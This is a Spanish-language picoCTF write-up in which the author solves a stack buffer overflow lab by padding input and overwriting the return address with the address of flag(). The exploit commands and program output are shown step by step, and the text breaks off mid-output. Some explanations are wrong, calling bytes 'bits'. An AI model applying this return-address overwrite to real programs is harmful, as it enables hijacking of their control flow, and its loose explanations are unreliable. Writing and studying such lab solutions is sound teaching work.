Overflow1
============
El ejercicio nos dice que debemos lograr direccionar el programa a la función flag()
Así mismo el archivo vuln.c nos muestra que tiene un buffer máximo de [64], Así que al sobrepasarlo obtendremos el overflow


Empecemos llenando el buffer.


    root@lanz$ python -c 'print "A"*65' | ./vuln
    Give me a string and lets see what happens: 
    Woah, were jumping to 0x8048705 !


Aún no pasa nada, ya que tenemos 8 bits que guarda en memoria, es como un repuesto.
Al sumar 8 (los bits) + 64 (el buffer)


    root@lanz$ python -c 'print "A"*72' | ./vuln
    Give me a string and lets see what happens: 
    Woah, were jumping to 0x8048705 !
    Violación de segmento


Ahora, lo que nos pide el ejercicio es lograr redireccionar a la función flag()
Así que obtendremos la dirección en memoria de la función y se la agregaremos a lo que ya tenemos, con eso lograremos que mantenga las "A"*72 y después de eso agregue la dirección de flag()


Con gdb, objdump, ida, etc... Con cualquiera podemos obtener la dirección.


```
gdb ./vuln
info functions
0x080485e6  flag
```


Como el computador lee las instrucciones de derecha a izquierda, debemos tomar la dirección (0x080485e6) y anotarla así mismo, de derecha a izquierda


    root@lanz$ python -c 'print "A"*72 + "\xe6\x85\x04\x08"' | ./vuln
    Give me a string and lets see what happens: 
    Woah, were jumping to 0x8048700 !
    Woah, were jumping to 0x8048705 !
    Violación de segmento


¿Por que habrá salido dos veces la instrucción?
(No lo sé, investigare y editare esto)


Así que aún no hemos llegado a la función flag


    Woah, were jumping to 0x8048700 !
    Woah, were jumping to 0x8048705 !


Si imprimimos "A"*73 vemos esto:


    root@lanz$ python -c 'print "A"*73 + "\xe6\x85\x04\x08"' | ./vuln
    Woah, were jumping to 0x8040008 !


Hemos cambiado el registro que direcciona!!


Al haber agregado 4 bits (el tamaño de la dirección de la función flag), entonces 72 + 4


    root@lanz$ python -c 'print "A"*76 + "\xe6\x85\x04\x08"' | ./vuln
    Give me a string and lets see what happens: 
    Woah, were jumping to 0x80485e6 !
    Flag File is Missing. please contact an Admin if you are running this on the shell server.


Si lo corremos en la shell de picoCTF


    user@pico$ python -c 'print "A"*76 + "\xe6\x85\x04\x08"' | ./vuln
    Give me a string and lets s
